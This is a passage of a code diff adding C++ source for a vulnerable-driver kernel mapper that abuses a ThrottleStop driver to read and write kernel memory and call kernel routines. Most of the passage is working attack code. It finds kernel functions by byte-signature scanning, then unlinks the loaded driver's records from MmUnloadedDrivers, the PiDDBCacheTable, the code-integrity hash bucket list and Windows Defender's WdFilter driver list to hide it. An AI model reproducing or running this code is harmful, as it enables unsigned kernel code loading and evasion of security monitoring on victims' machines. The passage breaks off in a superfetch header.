+			(char*)&quot;xxxxxxxxx????xxx&quot;);
+		if (!kernel_MmAllocateIndependentPagesEx) {
+			kdmLog(L&quot;[!] Failed to find MmAllocateIndependentPagesEx&quot; &lt;&lt; std::endl);
+			return 0;
+		}
+		kernel_MmAllocateIndependentPagesEx += 8;
+		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
+		if (!kernel_MmAllocateIndependentPagesEx) return 0;
+	}
+#endif
+
+	if (!ts_driver::CallKernelFunction(&amp;allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
+		return 0;
+
+	return allocated_pages;
+}
+
+bool ts_driver::MmFreeIndependentPages(uint64_t address, uint32_t size) {
+	static uint64_t kernel_MmFreeIndependentPages = 0;
+
+	if (!kernel_MmFreeIndependentPages) {
+#ifdef PDB_OFFSETS
+		kernel_MmFreeIndependentPages = KDSymbolsHandler::GetInstance()-&gt;GetOffset(L&quot;MmFreeIndependentPages&quot;);
+		if (!kernel_MmFreeIndependentPages) return false;
+		kernel_MmFreeIndependentPages += ts_driver::ntoskrnlAddr;
+#else
+		kernel_MmFreeIndependentPages = ts_driver::FindPatternInSectionAtKernel(&quot;PAGE&quot;, ts_driver::ntoskrnlAddr,
+			(BYTE*)&quot;\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF&quot;,
+			(char*)&quot;xxxxxxxxx????xxxxxxx&quot;);
+		if (!kernel_MmFreeIndependentPages) {
+			kernel_MmFreeIndependentPages = ts_driver::FindPatternInSectionAtKernel(&quot;PAGE&quot;, ts_driver::ntoskrnlAddr,
+				(BYTE*)&quot;\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B&quot;,
+				(char*)&quot;xx????xxxx????xxx&quot;);
+			if (!kernel_MmFreeIndependentPages) return false;
+			kernel_MmFreeIndependentPages += 9;
+		}
+		else {
+			kernel_MmFreeIndependentPages += 8;
+		}
+		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
+		if (!kernel_MmFreeIndependentPages) return false;
+#endif
+	}
+
+	uint64_t result{};
+	return ts_driver::CallKernelFunction(&amp;result, kernel_MmFreeIndependentPages, address, size);
+}
+
+BOOLEAN ts_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect) {
+	if (!address) return FALSE;
+
+	static uint64_t kernel_MmSetPageProtection = 0;
+
+	if (!kernel_MmSetPageProtection) {
+#ifdef PDB_OFFSETS
+		kernel_MmSetPageProtection = KDSymbolsHandler::GetInstance()-&gt;GetOffset(L&quot;MmSetPageProtection&quot;);
+		if (!kernel_MmSetPageProtection) return FALSE;
+		kernel_MmSetPageProtection += ts_driver::ntoskrnlAddr;
+#else
+		kernel_MmSetPageProtection = ts_driver::FindPatternInSectionAtKernel(&quot;PAGELK&quot;, ts_driver::ntoskrnlAddr,
+			(BYTE*)&quot;\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8&quot;,
+			(char*)&quot;xx??x???xxx&quot;);
+		if (!kernel_MmSetPageProtection) {
+			kernel_MmSetPageProtection = ts_driver::FindPatternInSectionAtKernel(&quot;PAGELK&quot;, ts_driver::ntoskrnlAddr,
+				(BYTE*)&quot;\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8&quot;,
+				(char*)&quot;xx??xx????x???xxx&quot;);
+			if (!kernel_MmSetPageProtection) return FALSE;
+			kernel_MmSetPageProtection += 13;
+		}
+		else {
+			kernel_MmSetPageProtection += 10;
+		}
+		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmSetPageProtection, 1, 5);
+		if (!kernel_MmSetPageProtection) return FALSE;
+#endif
+	}
+
+	BOOLEAN set_prot_status{};
+	if (!ts_driver::CallKernelFunction(&amp;set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
+		return FALSE;
+
+	return set_prot_status;
+}
+
+// ==================== Cleanup functions (unchanged logic) ====================
+
+bool ts_driver::ClearMmUnloadedDrivers() {
+	ULONG buffer_size = 0;
+	void* buffer = nullptr;
+
+	NTSTATUS status = NtQuerySystemInformation(static_cast&lt;SYSTEM_INFORMATION_CLASS&gt;(nt::SystemExtendedHandleInformation), buffer, buffer_size, &amp;buffer_size);
+
+	while (status == STATUS_INFO_LENGTH_MISMATCH) {
+		if (buffer != nullptr)
+			VirtualFree(buffer, 0, MEM_RELEASE);
+		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+		status = NtQuerySystemInformation(static_cast&lt;SYSTEM_INFORMATION_CLASS&gt;(nt::SystemExtendedHandleInformation), buffer, buffer_size, &amp;buffer_size);
+	}
+
+	if (!NT_SUCCESS(status) || buffer == nullptr) {
+		if (buffer != nullptr)
+			VirtualFree(buffer, 0, MEM_RELEASE);
+		return false;
+	}
+
+	uint64_t object = 0;
+	auto system_handle_inforamtion = static_cast&lt;nt::PSYSTEM_HANDLE_INFORMATION_EX&gt;(buffer);
+
+	for (auto i = 0u; i &lt; system_handle_inforamtion-&gt;HandleCount; ++i) {
+		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion-&gt;Handles[i];
+		if (current_system_handle.UniqueProcessId != reinterpret_cast&lt;HANDLE&gt;(static_cast&lt;uint64_t&gt;(GetCurrentProcessId())))
+			continue;
+		if (current_system_handle.HandleValue == hDevice) {
+			object = reinterpret_cast&lt;uint64_t&gt;(current_system_handle.Object);
+			break;
+		}
+	}
+
+	VirtualFree(buffer, 0, MEM_RELEASE);
+
+	if (!object)
+		return false;
+
+	uint64_t device_object = 0;
+	if (!ReadMemory(object + 0x8, &amp;device_object, sizeof(device_object)) || !device_object) return false;
+
+	uint64_t driver_object = 0;
+	if (!ReadMemory(device_object + 0x8, &amp;driver_object, sizeof(driver_object)) || !driver_object) return false;
+
+	uint64_t driver_section = 0;
+	if (!ReadMemory(driver_object + 0x28, &amp;driver_section, sizeof(driver_section)) || !driver_section) return false;
+
+	UNICODE_STRING us_driver_base_dll_name = { 0 };
+	if (!ReadMemory(driver_section + 0x58, &amp;us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) return false;
+
+	auto unloadedName = std::make_unique&lt;wchar_t[]&gt;((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
+	if (!ReadMemory((uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) return false;
+
+	us_driver_base_dll_name.Length = 0;
+	if (!WriteMemory(driver_section + 0x58, &amp;us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) return false;
+
+	kdmLog(L&quot;[+] MmUnloadedDrivers Cleaned: &quot; &lt;&lt; unloadedName &lt;&lt; std::endl);
+	return true;
+}
+
+PVOID ts_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
+	ULONG_PTR Instr = (ULONG_PTR)Instruction;
+	LONG RipOffset = 0;
+	if (!ReadMemory(Instr + OffsetOffset, &amp;RipOffset, sizeof(LONG)))
+		return nullptr;
+	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
+	return ResolvedAddr;
+}
+
+bool ts_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
+	if (!Resource) return 0;
+	static uint64_t kernel_fn = GetKernelModuleExport(ts_driver::ntoskrnlAddr, &quot;ExAcquireResourceExclusiveLite&quot;);
+	if (!kernel_fn) return 0;
+	BOOLEAN out;
+	return (CallKernelFunction(&amp;out, kernel_fn, Resource, wait) &amp;&amp; out);
+}
+
+bool ts_driver::ExReleaseResourceLite(PVOID Resource) {
+	if (!Resource) return false;
+	static uint64_t kernel_fn = GetKernelModuleExport(ts_driver::ntoskrnlAddr, &quot;ExReleaseResourceLite&quot;);
+	if (!kernel_fn) return false;
+	return CallKernelFunction&lt;void&gt;(nullptr, kernel_fn, Resource);
+}
+
+BOOLEAN ts_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
+	if (!Table) return false;
+	static uint64_t kernel_fn = GetKernelModuleExport(ts_driver::ntoskrnlAddr, &quot;RtlDeleteElementGenericTableAvl&quot;);
+	if (!kernel_fn) return false;
+	bool out;
+	return (CallKernelFunction(&amp;out, kernel_fn, Table, Buffer) &amp;&amp; out);
+}
+
+PVOID ts_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
+	if (!Table) return nullptr;
+	static uint64_t kernel_fn = GetKernelModuleExport(ts_driver::ntoskrnlAddr, &quot;RtlLookupElementGenericTableAvl&quot;);
+	if (!kernel_fn) return nullptr;
+	PVOID out;
+	if (!CallKernelFunction(&amp;out, kernel_fn, Table, Buffer))
+		return 0;
+	return out;
+}
+
+nt::PiDDBCacheEntry* ts_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
+	nt::PiDDBCacheEntry localentry{};
+	localentry.TimeDateStamp = timestamp;
+	localentry.DriverName.Buffer = (PWSTR)name;
+	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
+	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;
+	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&amp;localentry);
+}
+
+// Pattern scanning functions (unchanged - they use ReadMemory)
+
+uintptr_t ts_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
+	if (!dwAddress) return 0;
+	if (dwLen &gt; 1024 * 1024 * 1024) return 0;
+
+	auto sectionData = std::make_unique&lt;BYTE[]&gt;(dwLen);
+	if (!ReadMemory(dwAddress, sectionData.get(), dwLen))
+		return 0;
+
+	auto result = kdmUtils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
+	if (result &lt;= 0) return 0;
+	result = dwAddress - (uintptr_t)sectionData.get() + result;
+	return result;
+}
+
+uintptr_t ts_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
+	if (!modulePtr) return 0;
+	BYTE headers[0x1000];
+	if (!ReadMemory(modulePtr, headers, 0x1000)) return 0;
+	ULONG sectionSize = 0;
+	uintptr_t section = (uintptr_t)kdmUtils::FindSection(sectionName, (uintptr_t)headers, &amp;sectionSize);
+	if (!section || !sectionSize) return 0;
+	if (size) *size = sectionSize;
+	return section - (uintptr_t)headers + modulePtr;
+}
+
+uintptr_t ts_driver::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
+	ULONG sectionSize = 0;
+	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &amp;sectionSize);
+	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
+}
+
+// ==================== ClearPiDDBCacheTable ====================
+
+bool ts_driver::ClearPiDDBCacheTable() {
+#ifdef PDB_OFFSETS
+	auto PiDDBLockOffset = KDSymbolsHandler::GetInstance()-&gt;GetOffset(L&quot;PiDDBLock&quot;);
+	if (!PiDDBLockOffset) return false;
+	auto PiDDBCacheTableOffset = KDSymbolsHandler::GetInstance()-&gt;GetOffset(L&quot;PiDDBCacheTable&quot;);
+	if (!PiDDBCacheTableOffset) return false;
+	PVOID PiDDBLock = (PVOID)(ts_driver::ntoskrnlAddr + PiDDBLockOffset);
+	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)(ts_driver::ntoskrnlAddr + PiDDBCacheTableOffset);
+#else
+	auto PiDDBLockPtr = FindPatternInSectionAtKernel(&quot;PAGE&quot;, ts_driver::ntoskrnlAddr, (PUCHAR)&quot;\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24&quot;, &quot;xxxxxx????xxxxx????xxx????xxxxx????x????xx?x&quot;);
+	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel(&quot;PAGE&quot;, ts_driver::ntoskrnlAddr, (PUCHAR)&quot;\x66\x03\xD2\x48\x8D\x0D&quot;, &quot;xxxxxx&quot;);
+
+	if (PiDDBLockPtr == NULL) {
+		PiDDBLockPtr = FindPatternInSectionAtKernel(&quot;PAGE&quot;, ts_driver::ntoskrnlAddr, (PUCHAR)&quot;\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8&quot;, &quot;xxx????xxxxx????xxx????x????x&quot;);
+		if (PiDDBLockPtr == NULL) {
+			PiDDBLockPtr = FindPatternInSectionAtKernel(&quot;PAGE&quot;, ts_driver::ntoskrnlAddr, (PUCHAR)&quot;\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24&quot;, &quot;xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x&quot;);
+			if (PiDDBLockPtr == NULL) {
+				kdmLog(L&quot;[-] Warning PiDDBLock not found&quot; &lt;&lt; std::endl);
+				return false;
+			}
+			PiDDBLockPtr += 19;
+		}
+		else {
+			PiDDBLockPtr += 16;
+		}
+	}
+	else {
+		PiDDBLockPtr += 28;
+	}
+
+	if (PiDDBCacheTablePtr == NULL) {
+		PiDDBCacheTablePtr = FindPatternInSectionAtKernel(&quot;PAGE&quot;, ts_driver::ntoskrnlAddr, (PUCHAR)&quot;\x48\x8B\xF9\x33\xC0\x48\x8D\x0D&quot;, &quot;xxxxxxxx&quot;);
+		if (PiDDBCacheTablePtr == NULL) return false;
+		PiDDBCacheTablePtr += 2;
+	}
+
+	kdmLog(&quot;[+] PiDDBLock Ptr 0x&quot; &lt;&lt; std::hex &lt;&lt; PiDDBLockPtr &lt;&lt; std::endl);
+	kdmLog(&quot;[+] PiDDBCacheTable Ptr 0x&quot; &lt;&lt; std::hex &lt;&lt; PiDDBCacheTablePtr &lt;&lt; std::endl);
+
+	PVOID PiDDBLock = ResolveRelativeAddress((PVOID)PiDDBLockPtr, 3, 7);
+	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)ResolveRelativeAddress((PVOID)PiDDBCacheTablePtr, 6, 10);
+#endif
+
+	if (!ExAcquireResourceExclusiveLite(PiDDBLock, true)) return false;
+	kdmLog(L&quot;[+] PiDDBLock Locked&quot; &lt;&lt; std::endl);
+
+	auto n = GetDriverNameW();
+	auto timestamp = portable_executable::GetNtHeaders((void*)throttlestop_driver_resource::driver)-&gt;FileHeader.TimeDateStamp;
+
+	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
+	if (pFoundEntry == nullptr) {
+		kdmLog(L&quot;[+] Not found in PiDDB cache (signed driver, no cleanup needed)&quot; &lt;&lt; std::endl);
+		ExReleaseResourceLite(PiDDBLock);
+		return true;
+	}
+
+	PLIST_ENTRY prev;
+	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Blink)), &amp;prev, sizeof(_LIST_ENTRY*))) {
+		ExReleaseResourceLite(PiDDBLock);
+		return false;
+	}
+	PLIST_ENTRY next;
+	if (!ReadMemory((uintptr_t)pFoundEntry + (offsetof(struct nt::_PiDDBCacheEntry, List.Flink)), &amp;next, sizeof(_LIST_ENTRY*))) {
+		ExReleaseResourceLite(PiDDBLock);
+		return false;
+	}
+
+	kdmLog(&quot;[+] Found Table Entry = 0x&quot; &lt;&lt; std::hex &lt;&lt; pFoundEntry &lt;&lt; std::endl);
+
+	if (!WriteMemory((uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)), &amp;next, sizeof(_LIST_ENTRY*))) {
+		ExReleaseResourceLite(PiDDBLock);
+		return false;
+	}
+	if (!WriteMemory((uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)), &amp;prev, sizeof(_LIST_ENTRY*))) {
+		ExReleaseResourceLite(PiDDBLock);
+		return false;
+	}
+
+	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
+		ExReleaseResourceLite(PiDDBLock);
+		return false;
+	}
+
+	ULONG cacheDeleteCount = 0;
+	ReadMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &amp;cacheDeleteCount, sizeof(ULONG));
+	if (cacheDeleteCount &gt; 0) {
+		cacheDeleteCount--;
+		WriteMemory((uintptr_t)PiDDBCacheTable + (offsetof(struct nt::_RTL_AVL_TABLE, DeleteCount)), &amp;cacheDeleteCount, sizeof(ULONG));
+	}
+
+	ExReleaseResourceLite(PiDDBLock);
+	kdmLog(L&quot;[+] PiDDBCacheTable Cleaned&quot; &lt;&lt; std::endl);
+	return true;
+}
+
+// ==================== ClearKernelHashBucketList ====================
+
+bool ts_driver::ClearKernelHashBucketList() {
+	uint64_t ci = kdmUtils::GetKernelModuleAddress(&quot;ci.dll&quot;);
+	if (!ci) return false;
+
+#ifdef PDB_OFFSETS
+	auto g_KernelHashBucketListOffset = KDSymbolsHandler::GetInstance()-&gt;GetOffset(L&quot;g_KernelHashBucketList&quot;);
+	if (!g_KernelHashBucketListOffset) return false;
+	auto g_HashCacheLockOffset = KDSymbolsHandler::GetInstance()-&gt;GetOffset(L&quot;g_HashCacheLock&quot;);
+	if (!g_HashCacheLockOffset) return false;
+	PVOID g_KernelHashBucketList = (PVOID)(ci + g_KernelHashBucketListOffset);
+	PVOID g_HashCacheLock = (PVOID)(ci + g_HashCacheLockOffset);
+#else
+	auto sig = FindPatternInSectionAtKernel(&quot;PAGE&quot;, ci, PUCHAR(&quot;\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00&quot;), &quot;xxx????x?xxxxxxx&quot;);
+	if (!sig) return false;
+	auto sig2 = FindPatternAtKernel((uintptr_t)sig - 50, 50, PUCHAR(&quot;\x48\x8D\x0D&quot;), &quot;xxx&quot;);
+	if (!sig2) return false;
+	const auto g_KernelHashBucketList = ResolveRelativeAddress((PVOID)sig, 3, 7);
+	const auto g_HashCacheLock = ResolveRelativeAddress((PVOID)sig2, 3, 7);
+	if (!g_KernelHashBucketList || !g_HashCacheLock) return false;
+#endif
+
+	kdmLog(L&quot;[+] g_KernelHashBucketList Found 0x&quot; &lt;&lt; std::hex &lt;&lt; g_KernelHashBucketList &lt;&lt; std::endl);
+
+	if (!ExAcquireResourceExclusiveLite(g_HashCacheLock, true)) return false;
+	kdmLog(L&quot;[+] g_HashCacheLock Locked&quot; &lt;&lt; std::endl);
+
+	nt::HashBucketEntry* prev = (nt::HashBucketEntry*)g_KernelHashBucketList;
+	nt::HashBucketEntry* entry = 0;
+	if (!ReadMemory((uintptr_t)prev, &amp;entry, sizeof(entry))) {
+		ExReleaseResourceLite(g_HashCacheLock);
+		return false;
+	}
+	if (!entry) {
+		ExReleaseResourceLite(g_HashCacheLock);
+		return true;
+	}
+
+	std::wstring wdname = GetDriverNameW();
+	std::wstring search_path = GetDriverPath();
+	SIZE_T expected_len = (search_path.length() - 2) * 2;
+
+	while (entry) {
+		USHORT wsNameLen = 0;
+		if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Length), &amp;wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
+			ExReleaseResourceLite(g_HashCacheLock);
+			return false;
+		}
+
+		if (expected_len == wsNameLen) {
+			wchar_t* wsNamePtr = 0;
+			if (!ReadMemory((uintptr_t)entry + offsetof(nt::HashBucketEntry, DriverName.Buffer), &amp;wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
+				ExReleaseResourceLite(g_HashCacheLock);
+				return false;
+			}
+
+			auto wsName = std::make_unique&lt;wchar_t[]&gt;((ULONG64)wsNameLen / 2ULL + 1ULL);
+			if (!ReadMemory((uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
+				ExReleaseResourceLite(g_HashCacheLock);
+				return false;
+			}
+
+			size_t find_result = std::wstring(wsName.get()).find(wdname);
+			if (find_result != std::wstring::npos) {
+				kdmLog(L&quot;[+] Found In g_KernelHashBucketList: &quot; &lt;&lt; std::wstring(&amp;wsName[find_result]) &lt;&lt; std::endl);
+				nt::HashBucketEntry* Next = 0;
+				if (!ReadMemory((uintptr_t)entry, &amp;Next, sizeof(Next))) {
+					ExReleaseResourceLite(g_HashCacheLock);
+					return false;
+				}
+				if (!WriteMemory((uintptr_t)prev, &amp;Next, sizeof(Next))) {
+					ExReleaseResourceLite(g_HashCacheLock);
+					return false;
+				}
+				if (!FreePool((uintptr_t)entry)) {
+					ExReleaseResourceLite(g_HashCacheLock);
+					return false;
+				}
+				kdmLog(L&quot;[+] g_KernelHashBucketList Cleaned&quot; &lt;&lt; std::endl);
+				ExReleaseResourceLite(g_HashCacheLock);
+				return true;
+			}
+		}
+		prev = entry;
+		if (!ReadMemory((uintptr_t)entry, &amp;entry, sizeof(entry))) {
+			ExReleaseResourceLite(g_HashCacheLock);
+			return false;
+		}
+	}
+
+	ExReleaseResourceLite(g_HashCacheLock);
+	kdmLog(L&quot;[+] Not found in g_KernelHashBucketList (signed driver, no cleanup needed)&quot; &lt;&lt; std::endl);
+	return true;
+}
+
+// ==================== ClearWdFilterDriverList ====================
+
+bool ts_driver::ClearWdFilterDriverList() {
+	auto WdFilter = kdmUtils::GetKernelModuleAddress(&quot;WdFilter.sys&quot;);
+	if (!WdFilter) {
+		kdmLog(&quot;[+] WdFilter.sys not loaded, clear skipped&quot; &lt;&lt; std::endl);
+		return true;
+	}
+
+#ifdef PDB_OFFSETS
+	uintptr_t MpBmDocOpenRules = KDSymbolsHandler::GetInstance()-&gt;GetOffset(L&quot;MpBmDocOpenRules&quot;);
+	if (!MpBmDocOpenRules) return false;
+	MpBmDocOpenRules += WdFilter;
+	uintptr_t RuntimeDriversList_Head = MpBmDocOpenRules + 0x70;
+	uintptr_t RuntimeDriversCount = MpBmDocOpenRules + 0x60;
+	uintptr_t RuntimeDriversArray = MpBmDocOpenRules + 0x68;
+	ReadMemory(RuntimeDriversArray, &amp;RuntimeDriversArray, sizeof(uintptr_t));
+	uintptr_t MpFreeDriverInfoEx = KDSymbolsHandler::GetInstance()-&gt;GetOffset(L&quot;MpFreeDriverInfoEx&quot;);
+	if (!MpFreeDriverInfoEx) return false;
+	MpFreeDriverInfoEx += WdFilter;
+#else
+	auto RuntimeDriversList = FindPatternInSectionAtKernel(&quot;PAGE&quot;, WdFilter, (PUCHAR)&quot;\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05&quot;, &quot;xxx????xx&quot;);
+	if (!RuntimeDriversList) return false;
+
+	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel(&quot;PAGE&quot;, WdFilter, (PUCHAR)&quot;\xFF\x05\x00\x00\x00\x00\x48\x39\x11&quot;, &quot;xx????xxx&quot;);
+	if (!RuntimeDriversCountRef) return false;
+
+	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(&quot;PAGE&quot;, WdFilter, (PUCHAR)&quot;\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9&quot;, &quot;x?xx???????????x&quot;);
+	if (!MpFreeDriverInfoExRef) {
+		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(&quot;PAGE&quot;, WdFilter, (PUCHAR)&quot;\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9&quot;, &quot;x?x???x???????????x&quot;);
+		if (!MpFreeDriverInfoExRef) return false;
+		MpFreeDriverInfoExRef += 0x3;
+	}
+	MpFreeDriverInfoExRef += 0x3;
+
+	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversList, 3, 7);
+	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
+	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversCountRef, 2, 6);
+	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
+	ReadMemory(RuntimeDriversArray, &amp;RuntimeDriversArray, sizeof(uintptr_t));
+	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress((PVOID)MpFreeDriverInfoExRef, 1, 5);
+#endif
+
+	auto ReadListEntry = [&amp;](uintptr_t Address) -&gt; LIST_ENTRY* {
+		LIST_ENTRY* Entry;
+		if (!ReadMemory(Address, &amp;Entry, sizeof(LIST_ENTRY*))) return 0;
+		return Entry;
+	};
+
+	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
+		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
+		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
+	{
+		UNICODE_STRING Unicode_String;
+		if (ReadMemory((uintptr_t)Entry + 0x10, &amp;Unicode_String, sizeof(UNICODE_STRING))) {
+			auto ImageName = std::make_unique&lt;wchar_t[]&gt;((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
+			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
+				if (wcsstr(ImageName.get(), ts_driver::GetDriverNameW().c_str())) {
+					bool removedRuntimeDriversArray = false;
+					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
+					for (int k = 0; k &lt; 256; k++) {
+						PVOID value = 0;
+						ReadMemory(RuntimeDriversArray + (k * 8), &amp;value, sizeof(PVOID));
+						if (value == SameIndexList) {
+							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1);
+							WriteMemory(RuntimeDriversArray + (k * 8), &amp;emptyval, sizeof(PVOID));
+							removedRuntimeDriversArray = true;
+							break;
+						}
+					}
+					if (!removedRuntimeDriversArray) return false;
+
+					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
+					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));
+					WriteMemory(uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &amp;PrevEntry, sizeof(LIST_ENTRY::Blink));
+					WriteMemory(uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &amp;NextEntry, sizeof(LIST_ENTRY::Flink));
+
+					ULONG current = 0;
+					ReadMemory(RuntimeDriversCount, &amp;current, sizeof(ULONG));
+					current--;
+					WriteMemory(RuntimeDriversCount, &amp;current, sizeof(ULONG));
+
+					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;
+					USHORT Magic = 0;
+					ReadMemory(DriverInfo, &amp;Magic, sizeof(USHORT));
+					if (Magic != 0xDA18) {
+						kdmLog(&quot;[!] DriverInfo Magic invalid, skipping free&quot; &lt;&lt; std::endl);
+					}
+					else {
+						CallKernelFunction&lt;void&gt;(nullptr, MpFreeDriverInfoEx, DriverInfo);
+					}
+
+					kdmLog(&quot;[+] WdFilterDriverList Cleaned: &quot; &lt;&lt; ImageName &lt;&lt; std::endl);
+					return true;
+				}
+			}
+		}
+	}
+	kdmLog(&quot;[+] Not found in WdFilterDriverList (signed driver, no cleanup needed)&quot; &lt;&lt; std::endl);
+	return true;
+}
+</code></pre>
+<h3>include/superfetch.hpp</h3>
+<pre><code>#pragma once
+#include &lt;Windows.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;unordered_map&gt;
+#include &lt;vector&gt;
+#include &lt;memory&gt;
+
+namespace superfetch {
+
+	enum SUPERFETCH_INFORMATION_CLASS {
+		SuperfetchRetrieveTrace = 1,
+		SuperfetchSystemParameters = 2,
+		SuperfetchLogEvent = 3,
+		SuperfetchGenerateTrace = 4,
+		SuperfetchPrefetch = 5,
+		SuperfetchPfnQuery = 6,
+		SuperfetchPfnSetPriority = 7,
+		SuperfetchPrivSourceQuery = 8,
+		SuperfetchSequenceNumberQuery = 9,
+		SuperfetchScenarioPhase = 10,
+		SuperfetchWorkerPriority = 11,
+		SuperfetchScenarioQuery = 12,
+		SuperfetchScenarioPrefetch = 13,
+		SuperfetchRobustnessControl = 14,
+		SuperfetchTimeControl = 15,
+		SuperfetchMemoryListQuery = 16,
+		SuperfetchMemoryRangesQuery = 17,
+		SuperfetchTracingControl = 18,
+		SuperfetchTrimWhileAgingControl = 19,
+		SuperfetchInformationMax = 20
+	};
+
+	struct SUPERFETCH_INFORMATION {
+		ULONG Version = 45;
+		ULONG Magic = &#x27;kuhC&#x27;;
+		SUPERFETCH_INFORMATION_CLASS InfoClass;
+		PVOID Data;
+		ULONG Length;
+	};
+
+	struct MEMORY_FRAME_INFORMATION {
+		ULONGLONG UseDescription : 4;
+		ULONGLONG ListDescription : 3;
+		ULONGLONG Reserved0 : 1;
+		ULONGLONG Pinned : 1;
+		ULONGLONG DontUse : 48;
+		ULONGLONG Priority : 3;
+		ULONGLONG Reserved : 4;
+	};
+
+	struct FILEOFFSET_INFORMATION {
+		ULONGLONG DontUse : 9;
+		ULONGLONG Offset : 48;
